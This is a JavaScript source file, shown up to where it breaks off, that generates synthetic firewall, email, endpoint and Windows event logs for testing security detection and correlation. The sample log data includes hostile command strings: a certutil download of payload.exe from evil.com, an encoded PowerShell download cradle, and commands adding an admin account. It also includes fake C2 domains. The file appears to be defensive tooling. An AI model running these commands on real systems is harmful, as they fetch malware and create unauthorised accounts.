import { useState, useCallback, useEffect } from "react";

// ─── logUtils ────────────────────────────────────────────────────────────────
const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomHex = (len) => Array.from({length: len}, () => rand(0,15).toString(16)).join('');
const randomIP = () => `${rand(1,254)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
const randomPrivateIP = () => { if (_pool) return pick(_pool.ips); const s = pick(['10','172.16','192.168']); if(s==='10') return `10.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`; if(s==='172.16') return `172.${rand(16,31)}.${rand(0,255)}.${rand(1,254)}`; return `192.168.${rand(0,255)}.${rand(1,254)}`; };
const randomMAC = () => Array.from({length:6},()=>rand(0,255).toString(16).padStart(2,'0')).join(':');
const randomPort = () => pick([80,443,8080,8443,22,21,25,53,110,143,993,995,3389,445,139,1433,3306,5432,8888,9200]);
const randomHighPort = () => rand(49152,65535);
const _HOSTNAMES_BASE = () => `${pick(['WS','PC','LT','SRV','DC','DB','WEB','APP','FW','SW'])}-${pick(['NYC','LON','SFO','CHI','DAL','SEA','BOS','MIA'])}-${rand(100,999)}`;
const _USERS_LIST = ['jsmith','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones','tharris'];
const _ADMIN_USERS = ['Administrator','svc_backup','svc_deploy','sa_db','sysadmin','sqlservice','netadmin','backup_svc','svc_monitor','domain_admin'];
let _pool = null;
let _emailDomain = null;
let _hostnamePrefix = null;
let _includeAdminUsers = false;
// ─── Attack Correlation State ─────────────────────────────────────────────────
// Seeded once per generation run so DNS queries and firewall logs share the same
// source IPs and resolved C2 IPs, letting Attack Discovery correlate them.
let _attackCorrelations = [];
const _C2_ATTACK_DOMAINS = [
  'update-cdn.evil-corp.io','telemetry.malwarehost.net','beacon.c2panel.xyz',
  'api.stealth-c2.com','sync.darkhotel.net','cdn.apt-infra.io',
  'update.fakemicrosoft.net','analytics.spyware-c2.xyz',
  'exfil.data-stealer.net','heartbeat.c2relay.xyz',
  'loader.malicious-cdn.net','patch.windowsupdate-cdn.com',
];
function seedAttackCorrelations(n=8){
  _attackCorrelations=Array.from({length:n},(_,i)=>{
    const c2IP=randomIP();
    return{
      srcHost:`WS-${randomHex(4).toUpperCase()}`,
      srcIP:randomPrivateIP(),
      c2Domain:_C2_ATTACK_DOMAINS[i%_C2_ATTACK_DOMAINS.length],
      c2IP,
      c2Port:pick([80,443,8080,8443,4444,1337]),
      process:pick(['chrome.exe','svchost.exe','powershell.exe','rundll32.exe','wscript.exe','mshta.exe']),
    };
  });
}
function pickCorr(){return _attackCorrelations.length?_attackCorrelations[Math.floor(Math.random()*_attackCorrelations.length)]:null;}
function setPool(size, prefix=null) {
  if (size === null) { _pool = null; return; }
  const hSize = Math.max(2, size);
  const uSize = Math.max(2, Math.round(hSize * 0.6));
  const ipSize = Math.max(3, Math.round(hSize * 1.5));
  _pool = {
    hostnames: Array.from({length:hSize}, prefix ? ((_,i)=>`${prefix}-${String(i+1).padStart(3,'0')}`) : _HOSTNAMES_BASE),
    users: _USERS_LIST.slice(0, uSize),
    ips: Array.from({length:ipSize}, ()=>`192.168.${rand(1,5)}.${rand(1,254)}`),
  };
}
// Per-vendor pool caps: null = fully random, number = hard cap on unique hostnames/IPs/users
const VENDOR_POOL = {
  fortinet: { low: 4,   med: 8,   high: 16   },
  paloalto: { low: 4,   med: 8,   high: 16   },
  switch:   { low: 6,   med: 10,  high: 16   },
  email:    { low: 40,  med: 100, high: 200  },
  endpoint: { low: 20,  med: 100, high: null },
  windows:  { low: 16,  med: 80,  high: null },
  linux:    { low: 10,  med: 30,  high: null },
  oracle:      { low: 8,   med: 12,  high: 16   },
  mssql:       { low: 8,   med: 12,  high: 16   },
  cloudtrail:  { low: 20,  med: 50,  high: 100  },
  okta:        { low: 10,  med: 30,  high: 80   },
  crowdstrike: { low: 10,  med: 30,  high: 80   },
  wdns:        { low: 10,  med: 30,  high: null },
};
const VENDOR_RND_DEFAULT = {
  fortinet: 'med', paloalto: 'med', switch: 'low',
  email: 'med', endpoint: 'high', windows: 'med', linux: 'med',
  oracle: 'med', mssql: 'med',
  cloudtrail: 'med', okta: 'med', crowdstrike: 'med', wdns: 'med',
};
const VENDOR_LOG_COUNT = {
  fortinet: { low: 200, med: 500,  high: 1000 },
  paloalto: { low: 200, med: 500,  high: 1000 },
  switch:   { low: 100, med: 300,  high: 600  },
  email:    { low: 40,  med: 100,  high: 200  },
  endpoint: { low: 200, med: 600,  high: 2000 },
  windows:  { low: 200, med: 600,  high: 2000 },
  linux:    { low: 300, med: 1000, high: 3000 },
  oracle:      { low: 160, med: 500,  high: 1600 },
  mssql:       { low: 160, med: 500,  high: 1600 },
  cloudtrail:  { low: 200, med: 600,  high: 2000 },
  okta:        { low: 100, med: 300,  high: 1000 },
  crowdstrike: { low: 100, med: 300,  high: 1000 },
  wdns:        { low: 200, med: 600,  high: 2000 },
};
// Per Windows log type min counts by randomness level
const WIN_TYPE_LOG_COUNT = {
  security:    { low: 120, med: 300, high: 1000 },
  application: { low: 40,  med: 100, high: 300  },
  system:      { low: 40,  med: 100, high: 300  },
  applocker:   { low: 30,  med: 80,  high: 200  },
  powershell:  { low: 30,  med: 80,  high: 300  },
};
const WIN_TYPES_DEFAULT = ['security','application','system'];
const randomHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,999).toString().padStart(3,'0')}` : _HOSTNAMES_BASE();
const randomLinuxHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,99).toString().padStart(2,'0')}` : pick(LINUX_HOSTS);
const randomUser = () => (_includeAdminUsers && Math.random()<0.15) ? pick(_ADMIN_USERS) : _pool ? pick(_pool.users) : pick(_USERS_LIST);
const randomDomain = () => pick(['contoso.com','fabrikam.com','acme-corp.net','globex.io','initech.com','umbrella-corp.net']);
const randomEmail = () => `${randomUser()}@${_emailDomain||randomDomain()}`;
const formatTimestamp = (d) => d.toISOString();
const panTs = (d) => `${d.getUTCFullYear()}/${String(d.getUTCMonth()+1).padStart(2,'0')}/${String(d.getUTCDate()).padStart(2,'0')} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;
const PAN_SERIAL = '012345678901234';
const _SYSLOG_MONTHS=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
const syslogTimestamp = (d) => `${_SYSLOG_MONTHS[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2,' ')} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;
// Parse a syslog header timestamp ("Jan  5 10:30:00") as UTC using Date.UTC to
// avoid browser-dependent local/UTC ambiguity in new Date(string) parsing.
const parseSyslogTs=(s,year)=>{const m=s.match(/^(\w{3})\s+(\d+)\s+(\d{2}):(\d{2}):(\d{2})$/);if(!m)return new Date();const mi={Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};return new Date(Date.UTC(year,mi[m[1]],+m[2],+m[3],+m[4],+m[5]));};
const generateTimestamps = (count, mins=60) => { const now=new Date(), start=new Date(now-mins*60000); return Array.from({length:count},()=>new Date(start.getTime()+Math.random()*(now-start))).sort((a,b)=>a-b); };

// ─── Fortinet Generator ───────────────────────────────────────────────────────
function genFortiTraffic(ts) {
  const actions=['accept','deny','drop','close','timeout'], services=['HTTPS','HTTP','SSH','DNS','SMTP','RDP','FTP'];
  const policies=['allow-outbound','deny-inbound','dmz-access','vpn-traffic','web-filter','ips-block'];
  const apps=['Google.Chrome','Microsoft.Outlook','Slack','Zoom','Dropbox','SSH','RDP'];
  const hn=`FGT-${pick(['DC','EDGE','CORE'])}-${rand(1,5)}`;
  const corr=Math.random()<0.08?pickCorr():null;
  const srcip=corr?corr.srcIP:randomPrivateIP();
  const dstip=corr?corr.c2IP:randomIP();
  const dstport=corr?corr.c2Port:randomPort();
  const action=corr?pick(['accept','accept','deny']):pick(actions);
  const hostnameField=corr?` hostname="${corr.c2Domain}" dstcountry="Unknown"`:'';
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(ts/1000)} logid="000001${rand(1000,9999)}" type="traffic" subtype="forward" level="notice" srcip=${srcip} srcport=${randomHighPort()} dstip=${dstip} dstport=${dstport} action="${action}" policyname="${pick(policies)}" service="${corr?'HTTPS':pick(services)}" sentbyte=${rand(64,1500000)} rcvdbyte=${rand(64,2500000)} app="${pick(apps)}"${hostnameField}`;
}
function genFortiUTM(ts) {
  const threats=['Trojan.GenericKD','Riskware/BitCoinMiner','W32/Kryptik','JS/Phishing'];
  const hn=`FGT-${pick(['DC','EDGE'])}-${rand(1,3)}`;
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(ts/1000)} logid="042${rand(10000,99999)}" type="utm" subtype="${pick(['virus','ips','webfilter','app-ctrl'])}" level="${pick(['alert','warning'])}" srcip=${randomPrivateIP()} dstip=${randomIP()} action="${pick(['blocked','dropped','detected'])}" attack="${pick(threats)}" severity="${pick(['critical','high','medium','low'])}"`;
}
function genFortiVPN(ts) {
  const user=randomUser(), action=pick(['tunnel-up','tunnel-down','ssl-login-fail']);
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="FGT-EDGE-1" eventtime=${Math.floor(ts/1000)} logid="010${rand(10000,99999)}" type="event" subtype="vpn" level="notice" action="${action}" user="${user}" remip=${randomIP()} tunneltype="ssl-tunnel" msg="${action} for ${user}"`;
}
function generateFortinetLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.55?genFortiTraffic(ts):r<0.8?genFortiUTM(ts):genFortiVPN(ts);}); }

// ─── Palo Alto Generator ──────────────────────────────────────────────────────
// Format follows PAN-OS syslog CSV: <pri>syslogTs device FUTURE_USE,recv_time,serial,type,subtype,0,gen_time,...
const PAN_DEVICES=['PA-220','PA-820','PA-3220','PA-5220','PA-VM-50','PA-VM-300'];
const PAN_COUNTRIES=['United States','United Kingdom','Germany','France','Netherlands','Japan','Australia','Brazil','India','Singapore'];
const PAN_END_REASONS=['aged-out','tcp-fin','tcp-rst-from-client','tcp-rst-from-server','policy-deny','threat','decrypt-cert-validation'];
function genPANTraffic(ts) {
  const apps=['web-browsing','ssl','dns','smtp','ftp','ssh','ms-office365','slack','zoom','msrdp','kerberos','ldap'];
  const rules=['allow-internet','allow-internal','vpn-access','dmz-access','guest-wifi'];
  const corr=Math.random()<0.08?pickCorr():null;
  const action=corr?pick(['allow','allow','deny']):pick(['allow','allow','allow','deny','drop','reset-both']);
  const proto=corr?'tcp':pick(['tcp','udp','icmp']);
  const bytes=rand(100,5000000);
  const bytesSent=Math.floor(bytes*rand(30,70)/100);
  const bytesRcvd=bytes-bytesSent;
  const pkts=rand(1,5000);
  const startTs=new Date(ts.getTime()-rand(1000,300000));
  const elapsed=Math.floor((ts-startTs)/1000);
  const dev=pick(PAN_DEVICES);
  const pt=panTs(ts);
  const pst=panTs(startTs);
  const srcZone=pick(['trust','dmz','vpn']);
  const panSrcIp=corr?corr.srcIP:randomPrivateIP();
  const panDstIp=corr?corr.c2IP:randomIP();
  const panDstPort=corr?corr.c2Port:randomPort();
  const dstZone=srcZone==='trust'?'untrust':pick(['untrust','dmz']);
  // Fields: FUTURE_USE,recv_time,serial,TRAFFIC,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
  //         flags,proto,action,bytes,bytes_sent,bytes_rcvd,packets,start_time,elapsed,category,0,seq_no,0x0,
  //         src_location,dst_location,0,pkts_sent,pkts_rcvd,session_end_reason,0,0,0,0,vsys_name,device,action_source
  return `<14>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},TRAFFIC,${pick(['end','end','start','drop'])},0,${pt},${panSrcIp},${panDstIp},0.0.0.0,0.0.0.0,${pick(rules)},${randomUser()},,${pick(apps)},vsys1,${srcZone},${dstZone},ethernet1/${rand(1,4)},ethernet1/${rand(5,8)},default,0,${rand(1,65535)},1,${randomHighPort()},${panDstPort},0,0,0x400000,${proto},${action},${bytes},${bytesSent},${bytesRcvd},${pkts},${pst},${elapsed},any,0,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${corr?'Unknown':pick(PAN_COUNTRIES)},0,${Math.floor(pkts*0.55)},${pkts-Math.floor(pkts*0.55)},${pick(PAN_END_REASONS)},0,0,0,0,vsys1,${dev},from-policy`;
}
function genPANThreat(ts) {
  const threats=[
    {name:'SQL Injection Attempt',id:'32926',cat:'sql-injection',sev:'high',sub:'vulnerability'},
    {name:'OS Command Injection',id:'30663',cat:'code-execution',sev:'critical',sub:'vulnerability'},
    {name:'Conficker.C Virus',id:'10003',cat:'command-and-control',sev:'critical',sub:'virus'},
    {name:'Generic C2 HTTPS Traffic',id:'12345',cat:'command-and-control',sev:'medium',sub:'spyware'},
    {name:'CryptoWall Ransomware Domain',id:'20001',cat:'command-and-control',sev:'critical',sub:'spyware'},
    {name:'Trojan.Downloader.Generic',id:'10567',cat:'trojan',sev:'high',sub:'virus'},
    {name:'DNS Tunneling',id:'13001',cat:'data-exfiltration',sev:'high',sub:'spyware'},
    {name:'Phishing URL Detected',id:'54321',cat:'phishing',sev:'medium',sub:'url'},
  ];
  const t=pick(threats);
  const dev=pick(PAN_DEVICES);
  const pt=panTs(ts);
  const srcIp=Math.random()<0.6?randomPrivateIP():randomIP();
  const dstIp=randomIP();
  const pri=t.sev==='critical'?11:t.sev==='high'?12:13;
  // Fields: FUTURE_USE,recv_time,serial,THREAT,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
  //         flags,proto,action,threat_name(id),threat_id,category,severity,direction,seq_no,0x0,src_location,dst_location
  return `<${pri}>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},THREAT,${t.sub},0,${pt},${srcIp},${dstIp},0.0.0.0,0.0.0.0,${pick(['Block-Critical','Block-Threats','IPS-Policy'])},,${randomUser()},${pick(['web-browsing','ssl','dns','smtp'])},vsys1,${srcIp.startsWith('10.')||srcIp.startsWith('192.')?'trust':'untrust'},untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},${randomPort()},0,0,0x0,${pick(['tcp','udp'])},${pick(['alert','drop','reset-both'])},"${t.name}(${t.id})",${t.id},${t.cat},${t.sev},client-to-server,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${pick(PAN_COUNTRIES)}`;
}
function generatePaloAltoLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>Math.random()<0.6?genPANTraffic(ts):genPANThreat(ts)); }

// ─── Switch Generator ─────────────────────────────────────────────────────────
const SWITCH_NAMES=['SW-CORE-01','SW-DIST-NYC-01','SW-ACC-LON-03','SW-DC-SPINE-01','SW-DC-LEAF-02'];
const IFACE=()=>`${pick(['GigabitEthernet','TenGigabitEthernet','FastEthernet'])}${rand(0,4)}/${rand(0,48)}`;
function genSWLink(ts){const sw=pick(SWITCH_NAMES),iface=IFACE(),state=pick(['up','down']);return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %LINK-3-UPDOWN: Interface ${iface}, changed state to ${state}`;}
function genSWSecurity(ts){const sw=pick(SWITCH_NAMES),iface=IFACE(),mac=randomMAC(),vlan=rand(1,200);return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %${pick(['PORT_SECURITY-2-PSECURE_VIOLATION','DOT1X-5-SUCCESS','DOT1X-4-FAIL'])}: ${pick(['Security violation','Authentication event'])} on ${iface}, vlan ${vlan}, MAC ${mac}`;}
function genSWOSPF(ts){const sw=pick(SWITCH_NAMES),ip=randomPrivateIP();return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %OSPF-5-ADJCHG: Process ${rand(1,100)}, Nbr ${ip} on ${IFACE()} from ${pick(['FULL to DOWN','LOADING to FULL'])}${pick([', Dead timer expired',''])}`;}
function generateSwitchLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.35?genSWLink(ts):r<0.7?genSWSecurity(ts):genSWOSPF(ts);});}

// ─── Email Generator ──────────────────────────────────────────────────────────
function genExchange(ts){const verdicts=['Clean','Clean','Clean','Spam','Phish','BEC'],v=pick(verdicts),subj=v==='Clean'?pick(['Q4 Financial Report','Meeting Agenda','Weekly Status Update']):pick(['URGENT: Account Suspended','Wire Transfer Required','Verify your account']);return `${formatTimestamp(ts)},<${randomHex(8)}@${randomDomain()}>,${pick(['RECEIVE','SEND','DELIVER','QUARANTINE'])},${randomEmail()},${randomEmail()},"${subj}",${pick(['Inbound','Outbound'])},${v},${v==='Clean'?'Deliver':'Quarantine'},SCL:${v==='Clean'?rand(0,4):rand(5,9)},Size:${rand(1024,5242880)}`;}
function genPostfix(ts){const qid=randomHex(10).toUpperCase(),status=pick(['sent','sent','deferred','reject']),hn=`mail-gw-${rand(1,5)}.${randomDomain()}`;if(status==='reject')return `${syslogTimestamp(ts)} ${hn} postfix/smtpd[${rand(1000,65000)}]: NOQUEUE: reject: RCPT from unknown[${randomIP()}]: 554 5.7.1 Relay access denied`;return `${syslogTimestamp(ts)} ${hn} postfix/smtp[${rand(1000,65000)}]: ${qid}: to=<${randomEmail()}>, relay=mx1.${randomDomain()}[${randomIP()}]:25, status=${status}`;}
function genO365(ts){
  const r=Math.random();
  let op,workload,extra={};
  if(r<0.12){op='New-InboxRule';workload='Exchange';extra={Parameters:[{Name:'ForwardTo',Value:randomEmail()},{Name:'Name',Value:'Auto Forward'}]};}
  else if(r<0.22){op='Set-Mailbox';workload='Exchange';extra={Parameters:[{Name:'ForwardingSmtpAddress',Value:'smtp:'+randomEmail()},{Name:'DeliverToMailboxAndForward',Value:'True'}]};}
  else if(r<0.30){op='Add-MailboxPermission';workload='Exchange';extra={Parameters:[{Name:'AccessRights',Value:'FullAccess'},{Name:'User',Value:randomEmail()}]};}
  else if(r<0.36){op='New-TransportRule';workload='Exchange';extra={Parameters:[{Name:'BlindCopyTo',Value:randomEmail()},{Name:'Name',Value:'Silent Copy'}]};}
  else if(r<0.42){op='Set-AdminAuditLogConfig';workload='Exchange';extra={Parameters:[{Name:'UnifiedAuditLogIngestionEnabled',Value:'False'}]};}
  else if(r<0.48){op='UpdateInboxRules';workload='Exchange';extra={RuleOperation:'Create'};}
  else if(r<0.54){op='AnonymousLinkCreated';workload='SharePoint';extra={ObjectId:`/sites/Corp/Shared Documents/${pick(['Financial_Report.xlsx','HR_Data.csv','Passwords.xlsx','Strategy_2026.docx'])}`};}
  else if(r<0.60){op='FileDownloaded';workload='SharePoint';extra={ObjectId:`/sites/Corp/${pick(['Confidential/Budget.xlsx','HR/Employee_List.csv','IT/Network_Diagram.pdf'])}`};}
  else if(r<0.65){op='MailItemsAccessed';workload='Exchange';}
  else if(r<0.72){op='Send';workload='Exchange';}
  else if(r<0.78){op='UserLoggedIn';workload='AzureActiveDirectory';}
  else if(r<0.83){op='UserLoginFailed';workload='AzureActiveDirectory';extra={LogonError:'InvalidPassword'};}
  else if(r<0.88){op='MoveToDeletedItems';workload='Exchange';}
  else if(r<0.93){op='MailboxLogin';workload='Exchange';}
  else{op='SearchQueryInitiatedExchange';workload='Exchange';}
  const status=extra.LogonError?'Failed':pick(['Succeeded','Succeeded','Succeeded','Failed']);
  return JSON.stringify({CreationTime:formatTimestamp(ts),Operation:op,Workload:workload,ClientIP:randomIP(),UserId:randomEmail(),ResultStatus:status,...extra});
}
function generateEmailLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.4?genExchange(ts):r<0.7?genPostfix(ts):genO365(ts);});}

// ─── Endpoint Generator ───────────────────────────────────────────────────────
const SUSPICIOUS_CMDS=['powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQ...','cmd /c whoami /all > C:\\temp\\info.txt','certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\update.exe','wmic process call create "C:\\Windows\\Temp\\svc.exe"','net user admin$ P@ssw0rd123 /add'];
const NORMAL_CMDS=['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer','C:\\Windows\\System32\\svchost.exe -k netsvcs','C:\\Windows\\explorer.exe'];
function genEndpointProcess(ts){const susp=Math.random()<0.25,proc=susp?pick(['powershell.exe','cmd.exe','certutil.exe','rundll32.exe']):pick(['chrome.exe','outlook.exe','svchost.exe','explorer.exe']),hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"event",category:["process"],type:[pick(["start","end"])],action:"process_creation"},host:{name:hn,hostname:hn,ip:[randomPrivateIP()],os:{name:`Windows ${pick(['10','11'])}`}},user:{name:randomUser()},process:{name:proc,pid:rand(100,65535),command_line:susp?pick(SUSPICIOUS_CMDS):pick(NORMAL_CMDS),hash:{sha256:randomHex(64)}},...(susp?{threat:{framework:"MITRE ATT&CK",technique:{id:[`T${rand(1000,1999)}`]}}}:{})});}
function genEndpointNetwork(ts){const hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"event",category:["network"],type:["connection"],action:"network_flow"},host:{name:hn,hostname:hn,ip:[randomPrivateIP()]},source:{ip:randomPrivateIP(),port:randomHighPort()},destination:{ip:randomIP(),port:randomPort(),domain:randomDomain()},network:{transport:pick(["tcp","udp"]),direction:"outbound",bytes:rand(64,5000000)},process:{name:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe']),pid:rand(100,65535)}});}
const ALERT_NAMES=['Suspicious PowerShell Execution','Credential Dumping Detected','Lateral Movement via PsExec','Ransomware Behavior Detected','Persistence via Registry Run Key','Process Injection Detected','Data Exfiltration Attempt'];
function genEndpointAlert(ts){const hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"alert",category:["malware"],action:"alert_created",severity:rand(1,100)},host:{name:hn,hostname:hn},user:{name:randomUser()},rule:{name:pick(ALERT_NAMES),severity:pick(['critical','high','medium']),risk_score:rand(50,100)},process:{name:pick(['powershell.exe','cmd.exe','rundll32.exe']),command_line:pick(SUSPICIOUS_CMDS)},threat:{framework:"MITRE ATT&CK",tactic:{name:pick(['Execution','Credential Access','Lateral Movement','Exfiltration'])}}});}
function generateEndpointLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.4?genEndpointProcess(ts):r<0.7?genEndpointNetwork(ts):genEndpointAlert(ts);});}

// ─── Windows Event Generator ──────────────────────────────────────────────────
function genWinSecurity(ts){
  const isFailure=Math.random()<0.04,eid=isFailure?4625:4624;
  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,LogonType:String(pick([2,3,7,10])),AuthenticationPackageName:pick(['NTLM','Kerberos']),IpAddress:randomIP(),...(isFailure?{Status:pick(['0xC000006A','0xC0000064']),SubStatus:'0x0'}:{SubjectUserName:'-',SubjectDomainName:'-'})}},event:{code:String(eid),action:isFailure?'logon-failed':'logged-in',category:['authentication'],outcome:isFailure?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
function genWinAccountMgmt(ts){
  const eid=pick([4720,4722,4724,4726,4728,4732]);
  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
  const actions={4720:'user-account-created',4722:'user-account-enabled',4724:'password-reset',4726:'user-account-deleted',4728:'added-member-to-security-group',4732:'added-member-to-local-group'};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,SubjectUserName:pick(_USERS_LIST),SubjectDomainName:domain}},event:{code:String(eid),action:actions[eid]||'account-management',category:['iam'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
// ─── Windows Security Extra (Elastic prebuilt rule targets) ───────────────────
// Covers event IDs that Elastic's built-in detection rules specifically query:
//   4648 Explicit credential logon (RunAs / lateral movement)
//   4672 Special privileges assigned (SeDebugPrivilege / LSASS access)
//   4697 Service installed via Security channel (persistence)
//   4698/4702 Scheduled task created/modified (persistence)
//   1102 Security audit log cleared (defence evasion)
//   4769 Kerberos service ticket with RC4 (Kerberoasting)
//   4771 Kerberos pre-auth failed (password spray)
function genWinSecurityExtra(ts){
  const r=Math.random();
  const hn=randomHostname(),user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  if(r<0.18){
    // 4648 - Explicit credential logon (RunAs / lateral movement)
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4648,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:randomUser(),SubjectDomainName:domain,TargetUserName:user,TargetDomainName:domain,TargetServerName:randomHostname(),ProcessName:`C:\\Windows\\System32\\${pick(['runas.exe','cmd.exe','powershell.exe'])}`}},event:{code:'4648',action:'explicit-credentials-logon',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else if(r<0.34){
    // 4672 - Special privileges assigned (SeDebugPrivilege indicates potential LSASS access)
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4672,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,SubjectLogonId:`0x${randomHex(8)}`,PrivilegeList:pick(['SeDebugPrivilege\nSeImpersonatePrivilege','SeTcbPrivilege\nSeAssignPrimaryTokenPrivilege','SeBackupPrivilege\nSeRestorePrivilege'])}},event:{code:'4672',action:'special-privileges-logon',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else if(r<0.50){
    // 4697 - Service installed (persistence rule trigger)
    const svc=pick(['WindowsUpdate32','TelemetryHub','DiagnosticsAgent','winsrv64','svchost_upd']);
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4697,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,ServiceName:svc,ServiceFileName:pick([`C:\\Windows\\Temp\\${svc}.exe`,`C:\\ProgramData\\${svc}\\${svc}.dll`,`%SYSTEMROOT%\\system32\\${svc}.exe`]),ServiceType:'0x10',ServiceStartType:'2',ServiceAccount:'LocalSystem'}},event:{code:'4697',action:'service-installed',category:['process'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else if(r<0.66){
    // 4698/4702 - Scheduled task created or modified (persistence)
    const eid=Math.random()<0.7?4698:4702;
    const task=pick(['UpdateCheck','TelemetryAgent','MaintenanceRun','schtask_persist','SystemCleanup']);
    const cmd=pick(['C:\\Windows\\Temp\\update.exe','powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn','cmd /c net user admin$ /add','wscript.exe C:\\ProgramData\\evil.vbs','%SYSTEMROOT%\\system32\\cmd.exe /c whoami /all > C:\\temp\\info.txt']);
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,TaskName:`\\Microsoft\\Windows\\${task}`,TaskContent:`<Task><Actions><Exec><Command>${cmd}</Command></Exec></Actions></Task>`}},event:{code:String(eid),action:eid===4698?'scheduled-task-created':'scheduled-task-modified',category:['process'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else if(r<0.74){
    // 1102 - Security audit log cleared (defence evasion)
    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:1102,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,SubjectLogonId:`0x${randomHex(8)}`}},event:{code:'1102',action:'audit-log-cleared',category:['configuration'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
  }else if(r<0.94){
    // 4769 - Kerberos service ticket request with RC4 (0x17) = Kerberoasting indicator
